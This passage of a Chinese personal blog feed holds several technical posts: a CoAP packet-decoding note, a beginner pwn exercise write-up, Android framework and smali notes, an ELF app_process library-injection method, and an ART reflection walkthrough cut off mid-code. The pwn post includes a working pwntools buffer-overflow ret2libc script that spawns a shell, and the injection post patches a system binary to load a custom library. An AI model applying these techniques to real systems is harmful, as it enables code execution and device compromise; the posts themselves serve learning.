[RFC7252] |<br>| 0.04 | DELETE | [RFC7252] |<br>+——+——–+———–+<br>   表 5: CoAP Method Codes<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">msg id: 0110110100100100 27940</span><br></pre></td></tr></table></figure></p><p>字符串中没有出现ff ff,且tkl为0,所以后面的数据都是options<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">39 6c 6f 63 61 6c 68 6f 73 74</span><br></pre></td></tr></table></figure></p><p>首先将39转化为2进制 0011 1001,<br>按照option的格式来看,0011(3)即为option detla,因为这是第一个option,所以它的索引就是3<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> +-----+---+---+---+---+----------------+--------+--------+----------+</span><br><span class="line"> | No. | C | U | N | R | Name           | Format | Length | Default  |</span><br><span class="line"> +-----+---+---+---+---+----------------+--------+--------+----------+</span><br><span class="line"> |   1 | x |   |   | x | If-Match       | opaque | 0-8    | (none)   |</span><br><span class="line"> |   3 | x | x | - |   | Uri-Host       | string | 1-255  | (see     |</span><br><span class="line"> |     |   |   |   |   |                |        |        | below)   |</span><br><span class="line"> |   4 |   |   |   | x | ETag           | opaque | 1-8    | (none)   |</span><br><span class="line"> |   5 | x |   |   |   | If-None-Match  | empty  | 0      | (none)   |</span><br><span class="line"> |   7 | x | x | - |   | Uri-Port       | uint   | 0-2    | (see     |</span><br><span class="line"> |     |   |   |   |   |                |        |        | below)   |</span><br><span class="line"> |   8 |   |   |   | x | Location-Path  | string | 0-255  | (none)   |</span><br><span class="line"> |  11 | x | x | - | x | Uri-Path       | string | 0-255  | (none)   |</span><br><span class="line"> |  12 |   |   |   |   | Content-Format | uint   | 0-2    | (none)   |</span><br><span class="line"> |  14 |   | x | - |   | Max-Age        | uint   | 0-4    | 60       |</span><br><span class="line"> |  15 | x | x | - | x | Uri-Query      | string | 0-255  | (none)   |</span><br><span class="line"> |  17 | x |   |   |   | Accept         | uint   | 0-2    | (none)   |</span><br><span class="line"> |  20 |   |   |   | x | Location-Query | string | 0-255  | (none)   |</span><br><span class="line"> |  35 | x | x | - |   | Proxy-Uri      | string | 1-1034 | (none)   |</span><br><span class="line"> |  39 | x | x | - |   | Proxy-Scheme   | string | 1-255  | (none)   |</span><br><span class="line"> |  60 |   |   | x |   | Size1          | uint   | 0-4    | (none)   |</span><br><span class="line"> +-----+---+---+---+---+----------------+--------+--------+----------+</span><br><span class="line"></span><br><span class="line">C=Critical 临界, U=Unsafe 不安全, N=NoCacheKey 不缓存, R=Repeatable 可重复</span><br><span class="line"></span><br><span class="line">                           Table 4: Options</span><br></pre></td></tr></table></figure></p><p>对应的项为uri-host,而该option的length为1001(9),即长度为9,所以option的value即为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6c 6f 63 61 6c 68 6f 73 74</span><br></pre></td></tr></table></figure></p><p>根据ascii码表转换一下,就是localhost<br>所以这个coap包的内容就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ver: 1</span><br><span class="line">type: CON</span><br><span class="line">tkl: 0</span><br><span class="line">code: GET</span><br><span class="line">msg id: 27940</span><br><span class="line">uri-host: localhost</span><br></pre></td></tr></table></figure></p><h2 id="资源发现"><a href="#资源发现" class="headerlink" title="资源发现"></a>资源发现</h2><p>为了实现在没有人干预的情况下正常工作，CoAP提供了资源发现机制。这就是的客户端理解哪些URI是被支持，并且客户端可以获知该URI的具体含义。<br>CoAP协议建议，服务器端应该支持一个/.well-known/core，该URI可以被任何客户端访问。一个专门用于资源发现的服务器必须侦听默认的5683端口。<br>如果访问预先协商好的URI /.well-known/core，将会获得以下形式的响应：</p><p>&lt;sensors/temp&gt;;sz=512;title=Temperature Sensor;ct=50,&lt;actuators/jack&gt;;sz=256;title=Hydraulic Jacks;ct=50</p><p>上面的例子可以帮助我们深入理解服务器如何告诉客户端此处有哪些资源可以利用，通过这个例子可以获得以下信息：</p><ul><li>有一个URI为“sensors/temp”的设备，该设备的名称为“温度传感器”。有效载荷的内容类型为50字节（application/json，JSON格式）。当使用一个GET方法访问资源时，最小消息的长度为512字节。</li><li>除了温度之外还有另外一个资源，通过上面的例子可以发现资源和资源之间通过逗号分隔，该资源的URI为actuators/jack，该资源的名称为液压千斤顶，如果使用GET方法访问该资源的话，那么最大的数据包大小为256字节。有效载荷内容的大小为50字节（application/json，格式）。</li></ul><h2 id="实现注意事项"><a href="#实现注意事项" class="headerlink" title="实现注意事项"></a>实现注意事项</h2><ol><li>消息包大小</li><li>各种格式错误的判断</li><li>报文可能是无序的 (当使用单独响应时,可能会存在响应数据的包先于ack到达的情况,此时ack包的msg id和请求的相同,但是单独响应的这个包的msg id是新的,那这里怎么确定这个响应是给这个请求的?这个包可能是con类型的消息,如果提前到达的话就直接作为ack.依靠token以及额外的相关端地址来确定)</li></ol><p>在附带响应中，CON请求和ACK的“Message ID”必须匹配，响应和原始请求的“token”必须匹配。在单独响应中，只需响应和原始请求的“token”匹配。万一信息携带异常的响应（不是认定的端，端地址、token和客户端的期望不匹配），这个响应必须被拒绝</p><ol start="4"><li>UDP不可靠,可能需要重传机制</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://tools.ietf.org/html/rfc7252#section-5.8.2" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc7252#section-5.8.2</a></li><li><a href="https://github.com/WildDogTeam/contribute/blob/master/source/RFC7252-%E3%80%8A%E5%8F%97%E9%99%90%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE%E3%80%8B%E4%B8%AD%E6%96%87%E7%89%88.md" target="_blank" rel="noopener">https://github.com/WildDogTeam/contribute/blob/master/source/RFC7252-%E3%80%8A%E5%8F%97%E9%99%90%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE%E3%80%8B%E4%B8%AD%E6%96%87%E7%89%88.md</a></li><li><a href="https://segmentfault.com/a/1190000011533594" target="_blank" rel="noopener">https://segmentfault.com/a/1190000011533594</a></li><li><a href="http://fanzhenyu.me/2017/03/01/CoAP%20%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">http://fanzhenyu.me/2017/03/01/CoAP%20%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;coap-协议&quot;&gt;&lt;a href=&quot;#coap-协议&quot; class=&quot;headerlink&quot; title=&quot;coap 协议&quot;&gt;&lt;/a&gt;coap 协议&lt;/h1&gt;&lt;p&gt;最近需要弄着个，就稍微简单的过了一遍整个coap，蛮多其实都没记住的，先写这些吧，可能会有后续。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>pwn的一个入门题目</title>
    <link href="http://yoursite.com/2019/01/30/pwn%E7%9A%84%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E9%A2%98%E7%9B%AE/"/>
    <id>http://yoursite.com/2019/01/30/pwn%E7%9A%84%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E9%A2%98%E7%9B%AE/</id>
    <published>2019-01-29T16:50:54.000Z</published>
    <updated>2020-07-28T14:10:40.750Z</updated>
    
    <content type="html"><![CDATA[<p>前一阵看了一点点pwn的基础教程<a href="https://www.anquanke.com/post/id/168468，里面正好留了一个作业，就顺手做了一下，还是比较简单的" target="_blank" rel="noopener">https://www.anquanke.com/post/id/168468，里面正好留了一个作业，就顺手做了一下，还是比较简单的</a></p><a id="more"></a><p>首先checksec<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATHSymbolsFORTIFYFortifiedFortifiable  FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   83 Symbols     No04pwn7</span><br></pre></td></tr></table></figure></p><p>ida看到漏洞函数为gets</p><p>然后使用<br>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAACCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</p><p>这个超长的字符串,输入后查看报错信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">[!] Cannot disassemble from $PC</span><br><span class="line">[!] Cannot access memory at address 0x41414141</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure></p><p>找到返回值地址为AAAA的那个地方,即变量距离返回值地址112字节</p><p>ROPgadget –binary pwn7 –string “/bin/sh” 发现没有目标字符串<br>在ida中也没有看到相应的system函数导入</p><p>这里大致的思路是在get中传入字符串 /bin/sh ,并且使用系统调用</p><p>由于开启了NX,这里需要绕过</p><p>使用gdb查看libc.so的base addr<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  pwn LD_TRACE_LOADED_OBJECTS=1 ./pwn7</span><br><span class="line">linux-gate.so.1 =&gt;  (0xf7ef9000)</span><br><span class="line">libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d1d000)</span><br><span class="line">/lib/ld-linux.so.2 (0xf7efb000)</span><br></pre></td></tr></table></figure></p><p>在function view中查找system函数,得system地址为 0x0003ADA0<br>但是我这个ubuntu应该是开了随机化,加载lib库的地址不固定了,这里是直接读的proc/pid/maps</p><p>然后搜索/bin/sh字符串,发现还是没有,这里可以自己输入一个<br>最后构造的payload大概如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A*112</span><br><span class="line">system</span><br><span class="line">0xdeaebuff</span><br><span class="line">/bin/sh</span><br></pre></td></tr></table></figure></p><p>这里的/bin/sh不能直接放到payload中,需要预先放到某个位置,这里题目给预留了..0804A080 这里有个buf2</p><p>所以payload最后是这样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./pwn7&apos;)</span><br><span class="line">shelf = ELF(&apos;./pwn7&apos;)</span><br><span class="line">s_pid = proc.pidof(sh)[0]</span><br><span class="line">print s_pid</span><br><span class="line">proc_path = &apos;/proc/&apos; + str(s_pid) + &apos;/maps&apos;</span><br><span class="line">maps_str = os.popen(&apos;cat &apos; + proc_path).read()</span><br><span class="line">libc_base_addr = 0</span><br><span class="line">for s in maps_str.split(&apos;\n&apos;):</span><br><span class="line">    if s.find(&apos;libc-2.23.so&apos;) != -1 :</span><br><span class="line">        libc_base_addr = s.split(&apos;-&apos;)[0]</span><br><span class="line">        break</span><br><span class="line">libc_base_addr = int(libc_base_addr,16)</span><br><span class="line">print libc_base_addr</span><br><span class="line">gets_plt = shelf.plt[&apos;gets&apos;]</span><br><span class="line">print maps_str</span><br><span class="line"></span><br><span class="line">system_offset = 0x0003ADA0</span><br><span class="line">system_plt = libc_base_addr + system_offset</span><br><span class="line"></span><br><span class="line">pop_ebp = 0x080486ff</span><br><span class="line">buf2 = 0x0804A080</span><br><span class="line">payload = flat(</span><br><span class="line">    [&apos;a&apos; * 112, gets_plt, pop_ebp, buf2, system_plt, 0xabcdabcd, buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前一阵看了一点点pwn的基础教程&lt;a href=&quot;https://www.anquanke.com/post/id/168468，里面正好留了一个作业，就顺手做了一下，还是比较简单的&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/168468，里面正好留了一个作业，就顺手做了一下，还是比较简单的&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>在Android p上添加framework api</title>
    <link href="http://yoursite.com/2018/10/12/%E5%9C%A8Android-p%E4%B8%8A%E6%B7%BB%E5%8A%A0framework-api/"/>
    <id>http://yoursite.com/2018/10/12/%E5%9C%A8Android-p%E4%B8%8A%E6%B7%BB%E5%8A%A0framework-api/</id>
    <published>2018-10-11T16:38:39.000Z</published>
    <updated>2018-10-12T14:02:40.125Z</updated>
    
    <content type="html"><![CDATA[<p>前一阵往framework里面加了一些东西，然后需要将添加的api和系统api一样，防止被反射调用，查了一些博客之类的，都说是加个@hide这种注解就完事儿了，后来发现并不是这样。</p><p>问了一下同事，也大概查了一点，发现@hide这个东西，只能将对应的api在生成java doc的时候隐藏起来，但是并不能防止其被反射调用。后来又查了一些东西，发现正确的姿势应该是在framework/base/config中的hide-api相关的txt文件中，添加对应的api信息，看起来像是方法签名一类的东西，和smali有点像，不光有方法，还有一些是成员变量，加上去以后，就能成功防止其被反射调用了。</p><p>嗨呀又水了一篇，最近好像事情还挺多的，没什么时间学东西。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前一阵往framework里面加了一些东西，然后需要将添加的api和系统api一样，防止被反射调用，查了一些博客之类的，都说是加个@hide这种注解就完事儿了，后来发现并不是这样。&lt;/p&gt;
&lt;p&gt;问了一下同事，也大概查了一点，发现@hide这个东西，只能将对应的api在生成
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>smali从入门到自闭</title>
    <link href="http://yoursite.com/2018/09/28/smali%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E8%87%AA%E9%97%AD/"/>
    <id>http://yoursite.com/2018/09/28/smali%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E8%87%AA%E9%97%AD/</id>
    <published>2018-09-28T14:40:13.000Z</published>
    <updated>2020-07-28T14:10:45.016Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h4><p>嗨呀最近搞了一些smali的东西，踩到一些小坑，这里大概随便记点儿吧，常见的语法就不说了，最近弄的东西有点像smali的代码插桩，所以大概说的也是这里碰到的问题。</p><a id="more"></a><h4 id="0x01-关于寄存器"><a href="#0x01-关于寄存器" class="headerlink" title="0x01 关于寄存器"></a>0x01 关于寄存器</h4><p>在插桩的时候碰上一个这个问题，就是由于我的操作导致目标方法总数的寄存器大于15,即.locals这个值大于15,一开始没当回事，后来发现，p0和p后面的那些寄存器，数字都是这里开始的，比如当.locals 15的时候，再使用到p0寄存器的时候，它其实是v16,这一点是从apktool在重新打包的时候看出来的，报错会有提示，在invoke和new-array，以及iget等操作的时候，使用到的寄存器下标是不能大于15的。</p><p>后来在网上查到了一个相关的指令就是类似new-array/jumbo这种，但是实际操作发现不行，编辑器就标红了，打包的时候也报错说不支持这个指令，jumbo相关的都不行。</p><p>还有就是当寄存器下标大于15的时候，invoke这种就不行了，但是可以使用invoke-xxxxx/range来操作，我一开始以为只有寄存器数量超过5个才要用这个的，后来手写了一些比较长的java方法，反编译以后发现其实是有很多相关range的东西的，当寄存器下标过大时就需要这个，而且其实是可以只用一个的，例如invoke-xxxxx/range {v20 .. v20} 类似这样。</p><p>iget类似的这种，如果也使用到p0,那就得去用move-object/from16这种，先将它移动到一个下标小于15的寄存器，再去使用才行了。</p><h4 id="0x02-没了"><a href="#0x02-没了" class="headerlink" title="0x02 没了"></a>0x02 没了</h4><p>嗨呀还是太菜了，上班的时候各种沙雕操作都快要把自己秀自闭了。没牌面没牌面。</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h4&gt;&lt;p&gt;嗨呀最近搞了一些smali的东西，踩到一些小坑，这里大概随便记点儿吧，常见的语法就不说了，最近弄的东西有点像smali的代码插桩，所以大概说的也是这里碰到的问题。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>app_process注入</title>
    <link href="http://yoursite.com/2018/09/18/app-process%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2018/09/18/app-process%E6%B3%A8%E5%85%A5/</id>
    <published>2018-09-17T17:13:48.000Z</published>
    <updated>2020-07-28T14:10:00.526Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一种简单的app-process-全局注入方案"><a href="#一种简单的app-process-全局注入方案" class="headerlink" title="一种简单的app_process 全局注入方案"></a>一种简单的app_process 全局注入方案</h2><p>偶然在看雪看到的一篇文章,最近还看了一些elf相关的东西,所以结合一下记点儿东西.</p><blockquote><p><a href="https://bbs.pediy.com/thread-224191.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-224191.htm</a></p></blockquote><a id="more"></a><p>elf文件相关资料</p><blockquote><p><a href="https://paper.seebug.org/papers/Archive/refs/elf/Understanding_ELF.pdf" target="_blank" rel="noopener">https://paper.seebug.org/papers/Archive/refs/elf/Understanding_ELF.pdf</a></p></blockquote><p>app_process其实是一个elf文件,这里对它进行一些修改来达到自己的目的.</p><p>我的调试机是Nexus5 lineageOS 14,这里我们把它的app_process32 拷贝到本地,使用readelf看一下它的动态段</p><p><img src="https://github.com/EggUncle/Demo/blob/master/markdownimg/2018-09-17%2018-14-45%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png?raw=true" alt=""></p><p>其中有个DEBUG项,是用于调试的,没有明确定义格式,修改点就在这里.<br><br>由于需要对system分区进行读写操作,所以这里就先adb remount一下.</p><p>把app_process32 pull到本地,用010editor打开,因为DEBUG项的上一项标记为0x6ffffffa,所以这里在010editor中搜索faffff6f(小端序)<br><br><img src="https://github.com/EggUncle/Demo/blob/master/markdownimg/2018-09-17%2018-26-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png?raw=true" alt=""></p><p>其中标红部分即为需要修改的部分.<br>DT_DEBUG的标识为21,即0x15,值为0,这里将它改成DT_NEEDED,并将它的值改为一个so的名称(其实是索引),这里就不对字符串表做修改了,看看下面的DT_NEEDED项的字符串索引,然后改改写到目标位置.</p><p><img src="https://github.com/EggUncle/Demo/blob/master/markdownimg/2018-09-17%2018-38-39%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png?raw=true" alt=""></p><p>这里额外说一下关于elf字符串索引的东西,elf中字符串以00(null)结尾,然后在文件中都是根据字符串表的索引来获取对应字符串的内容,索引本身可以不从字符串的开头开始,假设存在android字符串且它是字符串表的第一个,则索引为0的时候,取到的字符串就是android,当索引为2的时候,获取到的字符串就是droid,以此类推.</p><p>修改以后文件内容如下:</p><p><img src="https://github.com/EggUncle/Demo/blob/master/markdownimg/2018-09-17%2018-39-42%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png?raw=true" alt=""></p><p>现在再用readelf打开文件,可以看到,对应的项已经变成一个NEEDED,而且对应一个叫ibc.so的共享库.</p><p>由于在app_process中JNI_onLoad不会执行,但是.init_array这个节会有一些初始化操作,其中包括了静态变量的初始化,所以这里写一个ibc.so且它的代码如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"library.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">staticClass</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    staticClass()&#123;</span><br><span class="line">        LOGE(<span class="string">"just a hook test"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> staticClass s;</span><br></pre></td></tr></table></figure></p><p>编译完成后,将它置于system/lib下,并将修改后的app_process32 push到system/bin下,重启手机,即可看到对应的log输出.</p><p><img src="https://github.com/EggUncle/Demo/blob/master/markdownimg/2018-09-17%2018-44-44%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png?raw=true" alt=""></p><p>整个过程其实挺简单的,但是我比较菜所以再稍微记一下其中的知识点.</p><h4 id="1-DT-NEEDED的作用"><a href="#1-DT-NEEDED的作用" class="headerlink" title="1.DT_NEEDED的作用"></a>1.DT_NEEDED的作用</h4><p>DT_NEEDED <br><br>此元素指明了一个所需的库的名字。不过此元素本身并不是一个字符串，它是一个指向由”DT_STRTAB”所标记的字符串表中的索引，在表中，此索引处是一个以’null’结尾的字符串，这个字符串就是库的名字。在动态数组中可以包含若干个此类型的项，这些项出现的相对顺序是不能随意调换的。</p><p>这里还涉及到一些动态链接的知识,当动态连接器为一个目标文件创建内存段的时候，动态结构中的DT_NEEDED项会指明所依赖的库，动态连接器会连接被引用的符号和它们所依赖的库，这个过程会反复地执行，直到一个完整的进程镜像被构建好。当解析一个符号引用的时候，动态连接器以一种“广度优先”的算法来查找符号表。就是说，动态连接器首先查找可执行程序自己的符号表，然后是DT_NEEDED项所指明的库的符号表，再接下来是下一层依赖库的符号表，依次下去。共享目标文件必须是可读的，其它权限没有要求。</p><h4 id="2-init-array-的作用"><a href="#2-init-array-的作用" class="headerlink" title="2. .init_array 的作用"></a>2. .init_array 的作用</h4><p>这里涉及到so的加载和启动过程</p><blockquote><p><a href="https://wps2015.org/drops/drops/Android%20Linker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html" target="_blank" rel="noopener">https://wps2015.org/drops/drops/Android%20Linker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</a></p></blockquote><p>该节中包含指针，这些指针指向了一些初始化代码。这些初始化代码一般是在main函数之前执行的。在C++程序中，这些代码用来运行静态构造函数。另外一个用途就是有时候用来初始化C库中的一些IO系统。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;一种简单的app-process-全局注入方案&quot;&gt;&lt;a href=&quot;#一种简单的app-process-全局注入方案&quot; class=&quot;headerlink&quot; title=&quot;一种简单的app_process 全局注入方案&quot;&gt;&lt;/a&gt;一种简单的app_process 全局注入方案&lt;/h2&gt;&lt;p&gt;偶然在看雪看到的一篇文章,最近还看了一些elf相关的东西,所以结合一下记点儿东西.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://bbs.pediy.com/thread-224191.htm&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://bbs.pediy.com/thread-224191.htm&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>art中反射查找方法的流程</title>
    <link href="http://yoursite.com/2018/08/22/art%E4%B8%AD%E5%8F%8D%E5%B0%84%E6%9F%A5%E6%89%BE%E6%96%B9%E6%B3%95%E7%9A%84%E6%B5%81%E7%A8%8B/"/>
    <id>http://yoursite.com/2018/08/22/art%E4%B8%AD%E5%8F%8D%E5%B0%84%E6%9F%A5%E6%89%BE%E6%96%B9%E6%B3%95%E7%9A%84%E6%B5%81%E7%A8%8B/</id>
    <published>2018-08-21T16:38:49.000Z</published>
    <updated>2020-07-28T14:10:17.194Z</updated>
    
    <content type="html"><![CDATA[<h2 id="art-反射-获取方法实例的流程"><a href="#art-反射-获取方法实例的流程" class="headerlink" title="art 反射 获取方法实例的流程"></a>art 反射 获取方法实例的流程</h2><h4 id="java层"><a href="#java层" class="headerlink" title="java层"></a>java层</h4><p>java这层就简单一点说了,获取到class对象以后,使用getDeclaredMethod,然后调用getMethod,调用到getDeclaredMethodInternal.</p><a id="more"></a><h4 id="虚机"><a href="#虚机" class="headerlink" title="虚机"></a>虚机</h4><p>getDeclaredMethodInternal是一个native方法,在java_lang_Class.cc中<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> jobject <span class="title">Class_getDeclaredMethodInternal</span><span class="params">(JNIEnv* env, jobject javaThis,</span></span></span><br><span class="line"><span class="function"><span class="params">                                               jstring name, jobjectArray args)</span> </span>&#123;</span><br><span class="line">  <span class="function">ScopedFastNativeObjectAccess <span class="title">soa</span><span class="params">(env)</span></span>;</span><br><span class="line">  StackHandleScope&lt;<span class="number">1</span>&gt; hs(soa.Self());</span><br><span class="line">  DCHECK_EQ(Runtime::Current()-&gt;GetClassLinker()-&gt;GetImagePointerSize(), kRuntimePointerSize);</span><br><span class="line">  DCHECK(!Runtime::Current()-&gt;IsActiveTransaction());</span><br><span class="line">  <span class="comment">//这一句应该就是最关键的,获取到方法的信息</span></span><br><span class="line">  Handle&lt;mirror::Method&gt; result = hs.NewHandle(</span><br><span class="line">      mirror::Class::GetDeclaredMethodInternal&lt;kRuntimePointerSize, <span class="literal">false</span>&gt;(</span><br><span class="line">          soa.Self(),</span><br><span class="line">          DecodeClass(soa, javaThis),</span><br><span class="line">          soa.Decode&lt;mirror::String&gt;(name),</span><br><span class="line">          soa.Decode&lt;mirror::ObjectArray&lt;mirror::Class&gt;&gt;(args)));</span><br><span class="line">  <span class="keyword">if</span> (result == <span class="literal">nullptr</span> || ShouldBlockAccessToMember(result-&gt;GetArtMethod(), soa.Self())) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> soa.AddLocalReference&lt;jobject&gt;(result.Get());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后看一下 GetDeclaredMethodInternal的实现<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 